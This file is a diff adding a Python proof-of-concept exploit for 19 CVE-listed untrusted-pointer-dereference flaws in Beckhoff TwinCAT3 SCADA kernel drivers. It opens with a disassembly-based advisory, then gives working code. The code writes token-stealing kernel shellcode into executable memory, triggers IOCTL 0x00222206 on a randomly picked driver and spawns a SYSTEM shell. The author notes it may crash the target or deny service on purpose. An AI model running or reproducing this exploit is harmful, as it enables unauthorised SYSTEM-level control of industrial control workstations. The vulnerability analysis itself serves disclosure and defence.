@@ -1,0 +1,274 @@
+"""
+Beckoff TwinCAT3 <= 3.1.4022.2 (latest) Multiple Kernel Drivers Untrusted Pointer Dereference Privilege Escalation Vulnerability [SCADA]
+Download: http://www.beckhoff.com/forms/twincat3/warenkorb.aspx?lg=en&title=TC31-Full-Setup.3.1.4022.2&version=3.1.4022.2
+File: TC31-Full-Setup.3.1.4022.2.zip
+SHA1: 29121120bf72cbee1298d7903921db93cfad6fb9
+
+Summary:
+========
+
+This vulnerability allows local attackers to escalate privileges on vulnerable installations of Beckoff TwinCAT3. An attacker must first obtain the ability to execute low-privileged code on the target system in order to exploit this vulnerability. The specific flaw exists within the processing of IOCTL 0x00222206 by the 19 different kernel drivers. The issue results from the lack of proper validation of a user-supplied value prior to dereferencing it as a pointer. An attacker can leverage this vulnerability to escalate privilege to the level of SYSTEM.
+
+Notes:
+======
+
+- This poc a sample exploit for Windows 7 sp1 x86. It will not work on any other platform without modification.
+- Further exploitation can be done on Windows10 to bypass smep. We have a pointer to controlled data in edx which can be used to pivot the stack to disable smep.
+- This poc will sometimes crash the target, I designed it like that on purpose, for fun :->
+- This poc is for 19 vulnerabilities:
+
+    - TcAnalytics.sys   [CVE-2017-14776]
+    - TcCnc.sys         [CVE-2017-14777]
+    - TcIoBACnetR9.sys  [CVE-2017-14778]
+    - TcIoCCat.sys      [CVE-2017-14779]
+    - TcIoDrivers.sys   [CVE-2017-14780]
+    - TcIoECat.sys      [CVE-2017-14781]
+    - TcIoECatSimu.sys  [CVE-2017-14782]
+    - TcIoESlv.sys      [CVE-2017-14783]
+    - TcIoEth.sys       [CVE-2017-14784]
+    - TcIoEthIp.sys     [CVE-2017-14785]
+    - TcIoPNet.sys      [CVE-2017-14786]
+    - TcIotDrivers.sys  [CVE-2017-14787]
+    - TcNcObjects.sys   [CVE-2017-14788]
+    - TcPlc30.sys       [CVE-2017-14789]
+    - TcRouter.sys      [CVE-2017-14790]
+    - TcRtsObjects.sys  [CVE-2017-14791]
+    - TcIo.sys          [CVE-2017-14792]
+    - TcNc.sys          [CVE-2017-14793]
+    - TcRTime.sys       [CVE-2017-14794]
+
+Static Analysis:
+================
+
+1. I'm only going to show the vulnerable code for TcAnalytics.sys, because this is **almost** mirrored code for the other 15 drivers:
+
+- TcCnc.sys
+- TcIoBACnetR9.sys
+- TcIoCCat.sys
+- TcIoDrivers.sys
+- TcIoECat.sys
+- TcIoECatSimu.sys
+- TcIoESlv.sys
+- TcIoEth.sys
+- TcIoEthIp.sys
+- TcIoPNet.sys
+- TcIotDrivers.sys
+- TcNcObjects.sys
+- TcPlc30.sys
+- TcRouter.sys
+- TcRtsObjects.sys
+
+When reaching the switch statement for the ioctl 0x00222206, we reach the following code block
+
+.text:00054F5A loc_54F5A:                                   ; CODE XREF: sub_54F30+23
+.text:00054F5A                                              ; DATA XREF: .text:off_55020
+.text:00054F5A                 mov     ecx, [ebx+10h]       ; jumptable 00054F53 case 2236934
+.text:00054F5D                 mov     eax, [edi+4]         ; edi is a pointer to our input buffer
+.text:00054F60                 mov     edx, [ecx]
+.text:00054F62                 mov     eax, [eax]           ; we get the first dword...
+.text:00054F64                 push    eax                  ; ...and place it as an argument to sub_54280
+.text:00054F65                 mov     eax, [edx+24h]       ; get the sub_54280 function
+.text:00054F68                 call    eax                  ; calls sub_54280
+
+In sub_54280, we find several untrusted pointer vulnerabilities, however, this report will just address one.
+
+.text:00054280 sub_54280       proc near                    ; DATA XREF: .rdata:0005CCDC
+.text:00054280                                              ; .rdata:0005CD78
+.text:00054280
+.text:00054280 var_28          = byte ptr -28h
+.text:00054280 var_18          = dword ptr -18h
+.text:00054280 var_14          = dword ptr -14h
+.text:00054280 var_10          = dword ptr -10h
+.text:00054280 var_C           = dword ptr -0Ch
+.text:00054280 var_8           = dword ptr -8
+.text:00054280 var_4           = dword ptr -4
+.text:00054280 arg_0           = dword ptr  8
+.text:00054280
+.text:00054280                 push    ebp
+.text:00054281                 mov     ebp, esp
+.text:00054283                 mov     edx, [ebp+arg_0]     ; this value is under our control and is a fake struct
+.text:00054286                 sub     esp, 28h
+.text:00054289                 mov     eax, [edx+8]         ; set a pointer @ +8
+.text:0005428C                 push    ebx
+.text:0005428D                 push    esi
+.text:0005428E                 push    edi
+.text:0005428F                 push    0BF0Bh
+.text:00054294                 push    eax                  ; push our controlled pointer to the stack
+.text:00054295                 mov     eax, [edx+2Ch]       ; set a fake function pointer
+.text:00054298                 mov     ebx, ecx
+.text:0005429A                 call    eax                  ; eop via an indirect call
+
+2. I'm only going to show the vulnerable code for TcIo.sys, because this is **almost** mirrored code for the other 2 drivers: 
+
+- TcNc.sys
+- TcRTime.sys
+
+When reaching the switch statement for the ioctl 0x00222206, we eventually reach the following code block in sub_5E510
+
+.text:0005E55B loc_5E55B:                                   ; CODE XREF: sub_5E510+45
+.text:0005E55B                 mov     ecx, [esi+4Ch]       ; @esi is our source buffer
+.text:0005E55E                 lea     eax, [ebp+var_34]
+.text:0005E561                 push    eax
+.text:0005E562                 mov     eax, [ecx+8]
+.text:0005E565                 push    eax
+.text:0005E566                 mov     eax, [ecx+14h]       ; get the function pointer
+.text:0005E569                 call    eax                  ; eop via an indirect call
+
+Thats a total of 19 vulnerable drivers within a single installation package.
+
+Example:
+========
+
+c:\Users\Guest\Desktop>whoami
+debugee\guest
+
+c:\Users\Guest\Desktop>poc.py
+[+] Beckoff TwinCAT3 <= 3.1
+[+] TcPlc30.sys Untrusted Pointer Dereference EoP vulnerability
+[+] Steven Seeley (mr_me) of Source Incite
+[+] allocating input buffer
+[+] allocating input buffer
+[+] sending ioctl
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+c:\Users\Guest\Desktop>whoami
+nt authority\system
+
+c:\Users\Guest\Desktop>
+"""
+
+import struct
+from os import system
+from sys import exit
+from ctypes import *
+from random import choice
+from platform import release, architecture
+
+kernel32 = windll.kernel32
+ntdll = windll.ntdll
+ 
+MEM_COMMIT = 0x00001000
+MEM_RESERVE = 0x00002000
+PAGE_EXECUTE_READWRITE = 0x00000040
+STATUS_SUCCESS = 0
+ 
+def alloc(base, input_size):
+    print "[+] allocating input buffer"
+    baseadd   = c_int(base)
+    size = c_int(input_size)
+    input  = struct.pack("<I", base + 0x04)      # fake vftable
+    input += "\x44" * 0x8
+    input += struct.pack("<I", base + 0x0c)      # pointer to our data to pivot to for win10 (need to disable SMEP)
+    input += "\x44" * 0x8
+    input += struct.pack("<I", 0xc0dedbad)       # eip for TcIo.sys, TcNc.sys and TcRTime.sys
+    input += "\x44" * 0x14
+    input += struct.pack("<I", base + 0x34)      # eip everything else
+
+    # --[ setup]
+    input += "\x60"                      # pushad
+    input += "\x64\xa1\x24\x01\x00\x00"  # mov eax, fs:[KTHREAD_OFFSET]
+    input += "\x8b\x40\x50"              # mov eax, [eax + EPROCESS_OFFSET]
+    input += "\x89\xc1"                  # mov ecx, eax (Current _EPROCESS structure)
+    input += "\x8b\x98\xf8\x00\x00\x00"  # mov ebx, [eax + TOKEN_OFFSET]
+
+    # --[ copy system PID token]
+    input += "\xba\x04\x00\x00\x00"      # mov edx, 4 (SYSTEM PID)
+    input += "\x8b\x80\xb8\x00\x00\x00"  # mov eax, [eax + FLINK_OFFSET] <-|
+    input += "\x2d\xb8\x00\x00\x00"      # sub eax, FLINK_OFFSET           |
+    input += "\x39\x90\xb4\x00\x00\x00"  # cmp [eax + PID_OFFSET], edx     |
+    input += "\x75\xed"                  # jnz                           ->|
+    input += "\x8b\x90\xf8\x00\x00\x00"  # mov edx, [eax + TOKEN_OFFSET]
+    input += "\x89\x91\xf8\x00\x00\x00"  # mov [ecx + TOKEN_OFFSET], edx
+
+    # --[ recover]
+    input += "\x61"                      # popad
+
+    # This is so we can take the jump at .text:000542A0 (jz loc_5456B)
+    input += "\x31\xc0"                  # xor eax, eax -> STATUS_SUCCESS
+    input += "\xc2\x08\x00\x00"          # ret 0x8
+
+    input += "\xcc" * (input_size-len(input))
+    ntdll.NtAllocateVirtualMemory.argtypes = [c_int, POINTER(c_int), c_ulong, 
+                                              POINTER(c_int), c_int, c_int]
+    dwStatus = ntdll.NtAllocateVirtualMemory(0xffffffff, byref(baseadd), 0x0, 
+                                             byref(size), 
+                                             MEM_RESERVE|MEM_COMMIT,
+                                             PAGE_EXECUTE_READWRITE)
+    if dwStatus != STATUS_SUCCESS:
+        print "[-] error while allocating memory: %s" % hex(dwStatus + 0xffffffff)
+        exit()
+    written = c_ulong()
+    write = kernel32.WriteProcessMemory(0xffffffff, base, input, len(input), byref(written))
+    if write == 0:
+        print "[-] error while writing our input buffer memory: %s" % write
+        exit()
+
+def get_device_name():
+    """
+    really, its like playing russian roulette
+    """
+    return choice([
+        "TcAnalytics",
+        "TcCnc",
+        "TcIoBACnetR9",
+        "TcIoCCat",
+        "TcIoDrivers",
+        "TcIoECat",
+        "TcIoECatSimu",
+        "TcIoESlv",
+        "TcIoEth",
+        "TcIoEthIp",
+        "TcIoPNet",
+        "TcIotDrivers",
+        "TcNcObjects",
+        "TcPlc30",
+        "TcRouter",
+        "TcRtsObjects",
+
+        # these last 3 will dos the system :->
+        # feel free to write the exploits for them, I got lazy.
+        "TcIo",
+        "TcNc",
+        "TcRTime"
+    ])
+
+if __name__ == '__main__':
+    print "[+] Beckoff TwinCAT3 <= 3.1"
+    device = get_device_name()
+    print "[+] %s.sys Driver Untrusted Pointer Dereference EoP vulnerability" % device
+    print "[+] Steven Seeley (mr_me) of Source Incite"
+    
+    if release() != "7" or architecture()[0] != "32bit":
+        print "(-) although this exploit may work on this system,"
+        print "    it was only designed for Windows 7 x86."
+        sys.exit(-1)
+
+    GENERIC_READ  = 0x80000000
+    GENERIC_WRITE = 0x40000000
+    OPEN_EXISTING = 0x3
+    IOCTL_VULN    = 0x00222206
+    DEVICE_NAME   = "\\\\.\\%s" % device
+    dwReturn      = c_ulong()
+    driver_handle = kernel32.CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, None)
+    inputbuffer   = 0x41414141
+    inputbuffer_size  = 0x1000
+    outputbuffer_size = 0x1000
+    outputbuffer      = 0x20000000
+    alloc(inputbuffer, inputbuffer_size)
+    alloc(outputbuffer, outputbuffer_size) 
+    IoStatusBlock = c_ulong()
+    if driver_handle:
+        print "[+] sending ioctl"
+        dev_ioctl = ntdll.ZwDeviceIoControlFile(driver_handle,
+                                       None,
+                                       None,
+                                       None,
+                                       byref(IoStatusBlock),
+                                       IOCTL_VULN,
+                                       inputbuffer,
+                                       inputbuffer_size,
+                                       outputbuffer,
+                                       outputbuffer_size
+                                       )
+        system("cmd.exe")
